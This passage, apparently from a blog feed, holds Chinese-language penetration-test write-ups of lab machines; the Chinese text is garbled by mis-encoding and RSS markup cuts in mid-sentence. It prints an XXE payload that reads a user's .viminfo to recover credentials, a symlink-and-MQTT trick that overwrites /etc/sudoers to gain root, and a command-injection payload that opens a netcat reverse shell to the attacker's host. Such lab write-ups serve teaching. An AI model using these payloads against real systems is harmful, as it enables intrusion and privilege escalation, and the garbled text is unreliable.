Á°ÆËÆ§ÊºèÊ¥ûÂêéÔºåÁõÆÊ†áÊòØÂà©Áî®ÂÆÉÊù•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØÔºåÊúÄÂ•ΩÊòØÁî®Êà∑Âá≠ÊçÆ„ÄÇËÄÉËôëÂà∞ `welcome` Áî®Êà∑ÁöÑÂ≠òÂú®ÔºåÊàëÂ∞ùËØïËØªÂèñÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑÂ∏∏ËßÅÊïèÊÑüÊñá‰ª∂„ÄÇÂú®Â∞ùËØï‰∫Ü `.bash_history`„ÄÅ`.ssh/id_rsa` Á≠âÊñá‰ª∂Êó†ÊûúÂêéÔºåÊàëÂÜ≥ÂÆöÂ∞ùËØïËØªÂèñ `.viminfo` Êñá‰ª∂„ÄÇVim ÁºñËæëÂô®ÁöÑÂéÜÂè≤ËÆ∞ÂΩïÊñá‰ª∂ÊúâÊó∂‰ºöÊÑèÂ§ñÂú∞ÂåÖÂê´ÂØÜÁ†ÅÊàñÂÖ∂‰ªñÊïèÊÑü‰ø°ÊÅØ„ÄÇ

* **ÊûÑÈÄ†ËØªÂèñ `.viminfo` ÁöÑ Payload:**

  ```http
  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM 'file:///home/welcome/.viminfo'&gt;]&gt;
  &lt;user&gt;
      &lt;name&gt;John Doe&lt;/name&gt;
      &lt;tel&gt;123-4567890&lt;/tel&gt;
      &lt;email&gt;&amp;xxe;&lt;/email&gt;
      &lt;password&gt;secret123&lt;/password&gt;
  &lt;/user&gt;
  ```

* **ÂèëÁé∞Âá≠ÊçÆ:**
  ÂèëÈÄÅËØ∑Ê±ÇÂêéÔºåÊúçÂä°Âô®ËøîÂõûÁöÑÂìçÂ∫î‰∏≠ÂåÖÂê´‰∫Ü `/home/welcome/.viminfo` Êñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇÂèØ‰ª•ÁúãÂà∞Ôºå‰πãÂâçÁöÑÁî®Êà∑ËØªÂèñ‰∫Ü`pass.txt`

  ![XXE Result - Credentials in .viminfo](https://7r1umphk.github.io/image/20250430203435219.png)

  Êàë‰ª¨ÈÄöËøáxxeËé∑Âèñpass.txtÊñá‰ª∂ÔºåÂèØ‰ª•ÂæóÂà∞

  ```html
  &lt;div class='result'&gt;Registration Status: Email „Äêwelcome:bd7787d41a6b28e9976873cf6a8445fe
  „Äë submitted!&lt;/div&gt;
  ```

  ÊàêÂäüÊèêÂèñÂà∞Âá≠ÊçÆÔºö`welcome:bd7787d41a6b28e9976873cf6a8445fe`

### 3.3. ÁôªÂΩïÁ≥ªÁªü (Gaining Access)

Ëé∑Âæó‰∫Ü `welcome` Áî®Êà∑ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºåÊàëÁ´ãÂç≥Â∞ùËØïÈÄöËøá SSH ÁôªÂΩïÁõÆÊ†áÁ≥ªÁªü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh welcome@192.168.205.197
The authenticity of host '192.168.205.197 (192.168.205.197)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.197' (ED25519) to the list of known hosts.
welcome@192.168.205.197's password: 
Linux Bamuwe 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 11 22:27:59 2025 from 192.168.3.94
welcome@Bamuwe:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

ÊàêÂäü‰ª• `welcome` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÁõÆÊ†áÁ≥ªÁªü„ÄÇ

## 4. ÊùÉÈôêÊèêÂçá (welcome -&gt; root - Sudo Misconfiguration &amp; MQTT Abuse)

### 4.1. ‰ª• welcome Ë∫´‰ªΩËøõË°å‰ø°ÊÅØÊî∂ÈõÜ (Enumeration as welcome)

ÁôªÂΩïÂêéÔºåÈ¶ñË¶Å‰ªªÂä°ÊòØÂØªÊâæÊùÉÈôêÊèêÂçáÁöÑÈÄîÂæÑ„ÄÇÊàëÈ¶ñÂÖàÊ£ÄÊü•‰∫Ü `welcome` Áî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
welcome@Bamuwe:~$ sudo -l
Matching Defaults entries for welcome on Bamuwe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Bamuwe:
    (ALL) NOPASSWD: /opt/sub.sh
```

ËøôÊòØ‰∏Ä‰∏™ÈáçÂ§ßÁöÑÂèëÁé∞ÔºÅ`welcome` Áî®Êà∑ÂèØ‰ª• **Êó†ÈúÄÂØÜÁ†Å** (`NOPASSWD`) ‰ª• **root** (`ALL`) ÊùÉÈôêÊâßË°å `/opt/sub.sh` ËÑöÊú¨„ÄÇÊé•‰∏ãÊù•ÔºåÈúÄË¶ÅÊ£ÄÊü•Ëøô‰∏™ËÑöÊú¨ÂÅö‰∫Ü‰ªÄ‰πà„ÄÇ

```bash
welcome@Bamuwe:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Apr 28 10:50 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rwxr-xr-x  1 root root   52 Apr 28 10:50 sub.sh
welcome@Bamuwe:~$ cat /opt/sub.sh
#!/bin/bash
/usr/bin/mosquitto_sub '$@' &gt; /home/welcome/sub.log
```

ËÑöÊú¨ÂÜÖÂÆπÂæàÁÆÄÂçïÔºöÂÆÉÊâßË°å `mosquitto_sub`Ôºà‰∏Ä‰∏™ MQTT ËÆ¢ÈòÖÂÆ¢Êà∑Á´ØÔºâÔºåÂπ∂Â∞ÜÊâÄÊúâÂëΩ‰ª§Ë°åÂèÇÊï∞ (`'$@'`) ‰º†ÈÄíÁªôËØ•ÂëΩ‰ª§„ÄÇÂÖ≥ÈîÆÂú®‰∫éÔºåËÑöÊú¨ÁöÑÊ†áÂáÜËæìÂá∫Ë¢´ÈáçÂÆöÂêëÂà∞‰∫Ü `/home/welcome/sub.log` Êñá‰ª∂„ÄÇÁî±‰∫éËÑöÊú¨ÊòØÈÄöËøá `sudo` ‰ª• root Ë∫´‰ªΩËøêË°åÁöÑÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ËÑöÊú¨‰ª• root ÊùÉÈôê **ÂÜôÂÖ•** `/home/welcome/sub.log` Êñá‰ª∂„ÄÇ

### 4.2. Âà©Áî®Á≠ñÁï• (Exploitation Strategy)

1. Ëøô‰∏™ `sudo` ËßÑÂàôÂíåËÑöÊú¨Êèê‰æõ‰∫Ü‰∏Ä‰∏™Ê∏ÖÊô∞ÁöÑÊèêÊùÉË∑ØÂæÑÔºöÂà©Áî® root ÊùÉÈôêÂÜôÂÖ• `/home/welcome/sub.log` ÁöÑËÉΩÂäõÔºåÁªìÂêàÁ¨¶Âè∑ÈìæÊé• (Symbolic Link) Êù•Ë¶ÜÁõñÁ≥ªÁªü‰∏äÁöÑ‰ªªÊÑèÊñá‰ª∂„ÄÇÊàë‰ª¨ÁöÑÁõÆÊ†áÊòØË¶ÜÁõñ `/etc/sudoers` Êñá‰ª∂ÔºåÊ∑ªÂä†‰∏ÄÊù°ÂÖÅËÆ∏ `welcome` Áî®Êà∑Êó†ÂØÜÁ†ÅÊâßË°åÊâÄÊúâÂëΩ‰ª§ÁöÑËßÑÂàô„ÄÇ

   ÂÖ∑‰ΩìËÆ°ÂàíÂ¶Ç‰∏ãÔºö

   1.  Âú® `/home/welcome/` ÁõÆÂΩï‰∏ãÔºåÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `sub.log` ÁöÑÁ¨¶Âè∑ÈìæÊé•ÔºåËÆ©ÂÆÉÊåáÂêë `/etc/sudoers`„ÄÇ
   2.  Âú®‰∏Ä‰∏™ SSH ÁªàÁ´Ø‰∏≠Ôºå‰ª• `welcome` Áî®Êà∑Ë∫´‰ªΩÊâßË°å `sudo /opt/sub.sh -t 'exp'` (ÈÄâÊã©‰∏Ä‰∏™ MQTT ‰∏ªÈ¢òÔºå‰æãÂ¶Ç 'exp')„ÄÇËøôÂ∞Ü‰ª• root ÊùÉÈôêÂêØÂä® `mosquitto_sub` ËøõÁ®ãÔºåËØ•ËøõÁ®ã‰ºöÁõëÂê¨ 'exp' ‰∏ªÈ¢òÔºåÂπ∂Â∞ÜÊî∂Âà∞ÁöÑ‰ªª‰ΩïÊ∂àÊÅØÂÜôÂÖ• `/home/welcome/sub.log`Ôºå‰πüÂ∞±ÊòØÈÄöËøáÁ¨¶Âè∑ÈìæÊé•ÂÜôÂÖ• `/etc/sudoers`„ÄÇ
   3.  ÊâìÂºÄÁ¨¨‰∫å‰∏™ SSH ÁªàÁ´ØÔºåÂêåÊ†∑‰ª• `welcome` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩï„ÄÇ‰ΩøÁî® `mosquitto_pub` ÂëΩ‰ª§Âêë 'exp' ‰∏ªÈ¢òÂèëÂ∏É‰∏ÄÊù°Êñ∞ÁöÑ `sudoers` ËßÑÂàôÔºå‰æãÂ¶Ç `welcome ALL=(ALL) NOPASSWD:ALL`„ÄÇ
   4.  ËøôÊù°ËßÑÂàô‰ºöË¢´Á¨¨‰∏Ä‰∏™ÁªàÁ´Ø‰∏≠‰ª• root Ë∫´‰ªΩËøêË°åÁöÑ `mosquitto_sub` Êé•Êî∂ÔºåÂπ∂Ë¶ÜÁõñ `/etc/sudoers` Êñá‰ª∂„ÄÇ
   5.  ÂÆåÊàê‰ª•‰∏äÊ≠•È™§ÂêéÔºå`welcome` Áî®Êà∑Â∫îËØ•Â∞±Ëé∑Âæó‰∫ÜÊó†ÂØÜÁ†ÅÊâßË°å‰ªª‰ΩïÂëΩ‰ª§ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

### 4.3. ÊâßË°åÂà©Áî® (Executing the Exploit)

ÊåâÁÖßËÆ°ÂàíÊâßË°åÔºö

1. **ÂàõÂª∫Á¨¶Âè∑ÈìæÊé•:**
   (È¶ñÂÖàÁ°Æ‰øù `/home/welcome/sub.log` ‰∏çÂ≠òÂú®ÔºåÊàñËÄÖÂà†Èô§ÂÆÉ)

   ```bash
   welcome@Bamuwe:~$ ln -sf /etc/sudoers /home/welcome/sub.log 
   ```

2. **ÂêØÂä® MQTT ËÆ¢ÈòÖËÄÖ (ÁõëÂê¨Âπ∂ÂáÜÂ§áÂÜôÂÖ• sudoers):**
   Âú®Á¨¨‰∏Ä‰∏™ SSH ÁªàÁ´ØÁ™óÂè£‰∏≠ÊâßË°åÔºö

   ```bash
   welcome@Bamuwe:~$ sudo /opt/sub.sh -t 'exp' 
   ```

   Ëøô‰∏™ÂëΩ‰ª§‰ºöÊåÇËµ∑ÔºåÁ≠âÂæÖÊ∂àÊÅØ„ÄÇÊ≠§Êó∂Ôºå‰∏Ä‰∏™‰ª• root ÊùÉÈôêËøêË°åÁöÑ `mosquitto_sub` ËøõÁ®ãÊ≠£Âú®ÁõëÂê¨ 'exp' ‰∏ªÈ¢òÔºåÂáÜÂ§áÂ∞ÜÊî∂Âà∞ÁöÑÊ∂àÊÅØÂÜôÂÖ• `/etc/sudoers`„ÄÇ

3. **ÂèëÂ∏ÉÊÅ∂ÊÑèÁöÑ Sudoers ËßÑÂàô:**
   ÊâìÂºÄÁ¨¨‰∫å‰∏™ SSH ÁªàÁ´ØÁ™óÂè£Ôºå‰ª• `welcome` Áî®Êà∑ÁôªÂΩïÔºåÂπ∂ÊâßË°åÔºö

   ```bash
   welcome@Bamuwe:~$ echo 'welcome ALL=(ALL) NOPASSWD:ALL' | mosquitto_pub -t 'exp' -l
   ```

   ËøôÊù°ÂëΩ‰ª§‰ΩøÁî® `mosquitto_pub` Â∞ÜÊàë‰ª¨Á≤æÂøÉÊûÑÈÄ†ÁöÑ `sudoers` ËßÑÂàô‰Ωú‰∏∫ÂçïË°åÊ∂àÊÅØ (`-l` ÈÄâÈ°π) ÂèëÂ∏ÉÂà∞ 'exp' ‰∏ªÈ¢ò„ÄÇ


### 4.4. Ëé∑Âèñ Root ÊùÉÈôê (Gaining Root Access)

Áé∞Âú®ÔºåÊÅ∂ÊÑèÁöÑ `sudoers` ËßÑÂàôÂ∫îËØ•Â∑≤ÁªèË¢´ÂÜôÂÖ• `/etc/sudoers` Êñá‰ª∂„ÄÇÊàë‰ª¨ÂèØ‰ª•È™åËØÅ `welcome` Áî®Êà∑ÁöÑÊñ∞ÊùÉÈôê„ÄÇ

1. **È™åËØÅÊñ∞ÊùÉÈôê:**
   ÂõûÂà∞**Á¨¨‰∫å‰∏™**ÁªàÁ´ØÔºåÊâßË°å `sudo -l`Ôºö

   ```bash
   welcome@Bamuwe:~$ sudo -l
   Matching Defaults entries for welcome on Bamuwe:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
   
   User welcome may run the following commands on Bamuwe:
       (ALL) NOPASSWD: ALL   # &lt;--- ÊàêÂäüÔºÅÊùÉÈôêÂ∑≤ÊèêÂçá
   ```

   ËæìÂá∫Á°ÆËÆ§ `welcome` Áî®Êà∑Áé∞Âú®ÂèØ‰ª•Êó†ÂØÜÁ†ÅÊâßË°åÊâÄÊúâÂëΩ‰ª§„ÄÇ

2. **Ëé∑Âèñ Root Shell:**
   ÊúÄÂêé‰∏ÄÊ≠•ÔºåÂàáÊç¢Âà∞ root Áî®Êà∑Ôºö

   ```bash
   welcome@Bamuwe:~$ sudo su -
   root@Bamuwe:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Bamuwe:~# whoami
   root
   ```

ÊàêÂäüËé∑Âèñ‰∫ÜÁõÆÊ†áÁ≥ªÁªüÁöÑ root ÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Bamuwe%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:08 +0000</pubDate></item><item><title>Ê∏óÈÄèÊµãËØïÊä•Âëä - AkaRed (ÊµãËØïÈù∂Êú∫)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html</link><description>## 1. ÁÆÄ‰ªã

**Èù∂Êú∫ÂêçÁß∞**: AkaRed (Êú™ÂèëÂ∏ÉÔºåÂÜÖÈÉ®ÊµãËØïÈù∂Êú∫ÔºåÂèØËÉΩÂêéÁª≠ÂèëÂ∏É‰∫é HackMyVm)
**ÈöæÂ∫¶**: Ë∂ÖÁ∫ßÁÆÄÂçï
**ÊîªÂáªËÄÖ IP:** `192.168.205.128` (Kali Linux)
**ÁõÆÊ†á IP:** `192.168.205.185` (AkaRed)

## 1. ‰ø°ÊÅØÊî∂ÈõÜ (Enumeration)

Ê≠§Èò∂ÊÆµÊó®Âú®ÂèëÁé∞ÁõÆÊ†áÂπ∂‰∫ÜËß£ÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

### 1.1. ÁΩëÁªúÂèëÁé∞ (Network Discovery)

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠Êé¢ÊµãÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÂõ†‰∏∫ÂÆÉÈÄöËøá ARP ËØ∑Ê±ÇËøõË°åÊâ´ÊèèÔºåÈÄöÂ∏∏ÊØî IP/Á´ØÂè£Êâ´ÊèèÊõ¥Âø´‰∏î‰∏çÊòìË¢´Èò≤ÁÅ´Â¢ôÊã¶Êà™„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo arp-scan -l # -l Ë°®Á§∫Êâ´ÊèèÊú¨Âú∞ÁΩëÁªú

Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (ÂÖ∂‰ªñ‰∏ªÊú∫) ...
192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  # &lt;-- ÂèëÁé∞ÁõÆÊ†á
# ... (ÂÖ∂‰ªñ‰∏ªÊú∫) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded
```

ÁõÆÊ†á‰∏ªÊú∫ IP Á°ÆÂÆö‰∏∫ `192.168.205.185`„ÄÇMAC Âú∞ÂùÄ `08:00:27:3b:24:68` ÂØπÂ∫îÁöÑÂéÇÂïÜ `PCS Systemtechnik GmbH` ÈÄöÂ∏∏‰∏é Oracle VirtualBox Áõ∏ÂÖ≥ËÅî„ÄÇ

### 1.2. Á´ØÂè£Êâ´Êèè (Port Scanning)

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†áËøõË°åÁ´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑ TCP Á´ØÂè£ÂèäËøêË°åÁöÑÊúçÂä°„ÄÇ

* È¶ñÂÖàËøõË°åÂÖ®Á´ØÂè£Êâ´Êèè (`-p-`)ÔºåÁ°Æ‰øù‰∏çÈÅóÊºè‰ªª‰ΩïÂèØËÉΩÂºÄÊîæÁöÑÁ´ØÂè£„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
  ‚îî‚îÄ$ nmap -p- 192.168.205.185    
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
  ```

* ÈíàÂØπÂ∑≤ÂèëÁé∞ÁöÑÁ´ØÂè£ËøõË°åÊõ¥ËØ¶ÁªÜÁöÑÊúçÂä°ÁâàÊú¨Êé¢Êµã„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
  ‚îî‚îÄ$ nmap -p22,80 -sV 192.168.205.185
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00027s latency).
  
  PORT   STATE SERVICE    VERSION
  22/tcp open  tcpwrapped
  80/tcp open  http       Apache httpd 2.4.59 ((Debian))
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
  ```

  Êâ´ÊèèÁªìÊûúÁ°ÆËÆ§Á´ØÂè£ 22 (SSH) Âíå 80 (HTTP) ÂºÄÊîæ„ÄÇ

### 1.3. Web ÊúçÂä°Êé¢Êµã (Web Enumeration)

‰ΩøÁî® `curl` Ê£ÄÊü• 80 Á´ØÂè£ÁöÑ HTTP ÊúçÂä°ÔºåËé∑ÂèñÁΩëÈ°µÂÜÖÂÆπ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 192.168.205.185
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;CyberPing 2077&lt;/title&gt;
    &lt;!-- ... CSS (Â∑≤ÁúÅÁï•) ... --&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class='container'&gt;
        &lt;h1 class='glitch'&gt;‚Æü CYBERPING 2077 ‚Æü&lt;/h1&gt;
        &lt;form method='post'&gt;
            &lt;input type='text' name='ip' placeholder='Enter target IP/command' required&gt;
            &lt;button type='submit'&gt;Execute Command&lt;/button&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

ÁΩëÈ°µÊ†áÈ¢ò‰∏∫ 'CyberPing 2077'ÔºåÂåÖÂê´‰∏Ä‰∏™Ë°®ÂçïÔºåËæìÂÖ•Ê°Ü `name='ip'` ‰∏îÊèêÁ§∫‰∏∫ 'Enter target IP/command'„ÄÇËøôÊûÅÊúâÂèØËÉΩÊòØ‰∏Ä‰∏™ÂÖÅËÆ∏Áî®Êà∑ËæìÂÖ• IP Âú∞ÂùÄÊâßË°å `ping` ÂëΩ‰ª§ÁöÑÂäüËÉΩÔºåÂπ∂‰∏îÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÁöÑÈ£éÈô©„ÄÇ

![](https://7r1umphk.github.io/image/20250411202259981.png)

## 2. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê (Initial Access - Command Injection)

Ê≠§Èò∂ÊÆµÂà©Áî® Web Â∫îÁî®ÁöÑÊºèÊ¥ûËé∑ÂèñÁõÆÊ†áÊúçÂä°Âô®ÁöÑ Shell„ÄÇ

### 2.1. Á°ÆËÆ§ÊºèÊ¥û (Confirming Vulnerability)

‰∏∫È™åËØÅÂëΩ‰ª§Ê≥®ÂÖ•ÔºåÊàë‰ª¨Âú® Web Ë°®Âçï‰∏≠ËæìÂÖ•ÊîªÂáªËÄÖÁöÑ IP Âú∞ÂùÄ `192.168.205.128`ÔºåÂπ∂ÊúüÊúõÁõÆÊ†áÊúçÂä°Âô®ÊâßË°å `ping 192.168.205.128`„ÄÇÂêåÊó∂ÔºåÂú®ÊîªÂáªËÄÖÊú∫Âô®‰∏äÂêØÂä® `tcpdump` ÁõëÂê¨ ICMP ÊµÅÈáè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo tcpdump -A -n icmp
# -A: ‰ª• ASCII ÊâìÂç∞Êä•ÊñáÂÜÖÂÆπ
# -n: ‰∏çËß£Êûê‰∏ªÊú∫Âêç
# icmp: Âè™ÊçïËé∑ ICMP ÂçèËÆÆÊµÅÈáè
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![](https://7r1umphk.github.io/image/20250411202357686.png)

Âú® Web È°µÈù¢Êèê‰∫§ IP ÂêéÔºå`tcpdump` ÊçïËé∑Âà∞Êù•Ëá™ÁõÆÊ†á IP ÁöÑ ICMP ËØ∑Ê±ÇÔºö

```bash
20:23:39.932006 IP 192.168.205.185 &gt; 192.168.205.128: ICMP echo request, id 1016, seq 1, length 64
# ... (ÂÖ∂‰ªñ ICMP ËØ∑Ê±ÇÂíåÂìçÂ∫î) ... 
```

ËøôËØÅÂÆû‰∫Ü Web Â∫îÁî®Á°ÆÂÆûÊâßË°å‰∫ÜÁî®Êà∑ËæìÂÖ•ÁöÑÂëΩ‰ª§ÔºàËá≥Â∞ëÊòØ `ping`ÔºâÔºåÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ

### 2.2. ÊºèÊ¥ûÂà©Áî® (Exploitation - Reverse Shell)

Âà©Áî®ÂëΩ‰ª§Ê≥®ÂÖ•ÁÇπÊâßË°å‰∏Ä‰∏™ÂèçÂêë Shell Payload„ÄÇ‰ΩøÁî®ÂàÜÂè∑ `;` ‰Ωú‰∏∫ÂëΩ‰ª§ÂàÜÈöîÁ¨¶ÔºåÂÖàÁªìÊùüÂèØËÉΩÂ≠òÂú®ÁöÑ `ping` ÂëΩ‰ª§ÔºåÁÑ∂ÂêéÊâßË°å `netcat` ÂëΩ‰ª§Â∞ÜÁõÆÊ†áÊúçÂä°Âô®ÁöÑ `/bin/bash` Shell ÂèçÂºπÂõûÊîªÂáªËÄÖÊú∫Âô®„ÄÇ

* **Payload:**

  ```
  ;nc 192.168.205.128 8888 -e /bin/bash
  ```

  (Ê≥®ÊÑèÔºö`;` Á°Æ‰øù `nc` ÂëΩ‰ª§Áã¨Á´ãÊâßË°å„ÄÇ`-e /bin/bash` ÊåáÂÆöËøûÊé•ÊàêÂäüÂêéÊâßË°åÁöÑÁ®ãÂ∫è„ÄÇ)

* **ÊîªÂáªËÄÖÁõëÂê¨:** Âú® Kali ‰∏ä‰ΩøÁî® `netcat` ÁõëÂê¨ 8888 Á´ØÂè£„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
  ‚îî‚îÄ$ nc -lvnp 8888
  # -l: ÁõëÂê¨Ê®°Âºè
  # -v: ËØ¶ÁªÜËæìÂá∫
  # -n: ‰∏çËß£Êûê‰∏ªÊú∫Âêç
  # -p 8888: ÊåáÂÆöÁõëÂê¨Á´ØÂè£
  listening on [any] 8888 ...
  ```

* **Ëé∑Âèñ Shell:** Âú® Web È°µÈù¢Êèê‰∫§ Payload ÂêéÔºåÊîªÂáªËÄÖÁöÑ `nc` ÁõëÂê¨Âô®Êé•Êî∂Âà∞ËøûÊé•„ÄÇ

  ```bash
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
  # Ê≠§Êó∂Â∑≤Ëé∑ÂæóÁõÆÊ†áÊúçÂä°Âô® ShellÔºåÁî®Êà∑‰∏∫ www-data
  ```

  ÊàêÂäüËé∑Âèñ‰∫ÜËøêË°å Web ÊúçÂä°Âô®ÁöÑÁî®Êà∑ (`www-data`) ÁöÑ Shell„ÄÇ

### 2.3. Shell ÂçáÁ∫ß (Shell Upgrade)

ÂàùÂßãËé∑ÂæóÁöÑ Shell ÈÄöÂ∏∏ÊòØÈùû‰∫§‰∫íÂºèÁöÑÔºåÂäüËÉΩÂèóÈôêÔºàÂ¶ÇÊ≤°Êúâ Tab Ë°•ÂÖ®„ÄÅÊó†Ê≥ïËøêË°å `sudo` Á≠âÔºâ„ÄÇÈúÄË¶ÅÂçáÁ∫ß‰∏∫ÂäüËÉΩÂÆåÊï¥ÁöÑ TTY„ÄÇ

```bash
# Âú®ÁõÆÊ†á Shell ‰∏≠ÊâßË°å:
$ script /dev/null -c bash   # ‰ΩøÁî® script ÂàõÂª∫‰∏Ä‰∏™‰º™ÁªàÁ´Ø
# Êåâ‰∏ã Ctrl+Z Â∞ÜÂÖ∂ÁΩÆ‰∫éÂêéÂè∞

# Âú®ÊîªÂáªËÄÖ Kali ÁªàÁ´Ø‰∏≠ÊâßË°å:
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ stty raw -echo; fg      # ËÆæÁΩÆÊú¨Âú∞ÁªàÁ´ØÊ®°ÂºèÔºåÂπ∂Â∞ÜÂêéÂè∞‰ªªÂä°Ë∞ÉÂõûÂâçÂè∞
# Êåâ‰∏§Ê¨° Enter ÈîÆ

# ÂõûÂà∞ÁõÆÊ†á Shell ‰∏≠ÊâßË°å:
reset xterm                  # ÈáçÁΩÆÁªàÁ´ØÁ±ªÂûã
export TERM=xterm            # ËÆæÁΩÆÁªàÁ´ØÁéØÂ¢ÉÂèòÈáè
export SHELL=/bin/bash       # ËÆæÁΩÆ SHELL ÁéØÂ¢ÉÂèòÈáè
stty rows 59 cols 236      # (ÂèØÈÄâ) ËÆæÁΩÆÁªàÁ´ØÂ∞∫ÂØ∏‰ª•ÂåπÈÖçÊú¨Âú∞ÁªàÁ´Ø
```

Áé∞Âú®Êã•Êúâ‰∫Ü‰∏Ä‰∏™ÂäüËÉΩÊõ¥ÂÆåÂñÑÁöÑ‰∫§‰∫íÂºè Shell„ÄÇ

## 3. ÊùÉÈôêÊèêÂçá (www-data -&gt; welcome)

Ê≠§Èò∂ÊÆµÁõÆÊ†áÊòØ‰ªé `www-data` Áî®Êà∑ÊèêÂçáÂà∞ÊùÉÈôêÊõ¥È´òÁöÑÁî®Êà∑„ÄÇ

### 3.1. ‰ª• www-data Ë∫´‰ªΩËøõË°å‰ø°ÊÅØÊî∂ÈõÜ (Enumeration as www-data)

* **Web ÁõÆÂΩïÊé¢Á¥¢:**

  ```bash
  www-data@AkaRed:/var/www/html$ ls -al
  total 16
  # ...
  -rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt
  ```

  ÂèëÁé∞ `robots.txt` Êñá‰ª∂„ÄÇ

* **Ê£ÄÊü• `robots.txt`:**

  ```bash
  www-data@AkaRed:/var/www/html$ cat robots.txt 
  d2VsY29tZTpha2FyZWQ=
  ```

  ËøôÊòØ‰∏Ä‰∏≤ Base64 ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

* **Ëß£Á†Å Base64:**

  ```bash
  www-data@AkaRed:/var/www/html$ echo 'd2VsY29tZTpha2FyZWQ=' | base64 -d
  welcome:akared
  ```

  Ëß£Á†ÅÂæóÂà∞Âá≠ÊçÆ `welcome:akared`„ÄÇÂ∞ùËØï‰ΩøÁî®Ê≠§Âá≠ÊçÆ `su welcome`Ôºå‰ΩÜÊ†πÊçÆÂêéÁª≠Êìç‰ΩúÂà§Êñ≠ÔºåÊ≠§ÂØÜÁ†Å **‰∏çÊ≠£Á°Æ** „ÄÇ

* **Ê£ÄÊü•ÂÆ∂ÁõÆÂΩï:**

  ```bash
